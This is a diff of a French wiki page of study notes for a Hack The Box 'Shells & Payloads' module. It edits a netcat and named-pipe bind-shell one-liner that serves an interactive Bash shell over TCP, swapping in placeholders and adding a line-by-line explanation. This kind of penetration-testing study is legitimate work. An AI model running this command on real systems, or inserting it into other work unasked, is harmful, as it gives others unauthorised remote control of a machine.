@@ -2,7 +2,7 @@
 title: Shells & Payloads
 description: 
 published: true
-date: 2025-05-08T14:39:49.821Z
+date: 2025-05-08T14:43:58.721Z
 tags: htb, module
 editor: markdown
 dateCreated: 2025-05-04T16:19:33.360Z
@@ -114,9 +114,31 @@ nc -nv <ip> 7777
 
 Après avoir vu comment envoyer du texte entre le client et le serveur, nous allons voir comment servir un shell pour établir un vrai Bind Shell.
 
-Lier un shell Bash à la session TCP avec nc et un cannal nommé FIFO:
+Exemple pour lier un shell Bash à la session TCP avec nc et un cannal nommé FIFO:
 
 ```
-rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <ip cible> <port cible> > /tmp/f
 ```
+
+1. **`rm -f /tmp/f`**
+	Supprime le fichier `/tmp/f` s’il existe déjà.
+
+2. **`mkfifo /tmp/f`**
+	Crée un pipe nommé (FIFO) pour permettre la communication entre processus.
+
+3. **`cat /tmp/f | /bin/bash -i`**
+	Envoie les commandes lues du pipe à un shell interactif Bash.
+
+4. **`2>&1`**
+	Redirige les erreurs vers la sortie standard pour tout récupérer.
+
+5. **`| nc -l 10.129.41.200 7777`**
+	Envoie la sortie du shell à Netcat, qui écoute sur l’IP et le port donnés.
+
+6. **`> /tmp/f`**
+	Redirige ce que Netcat reçoit vers le pipe.
+  
+  
+
+
 
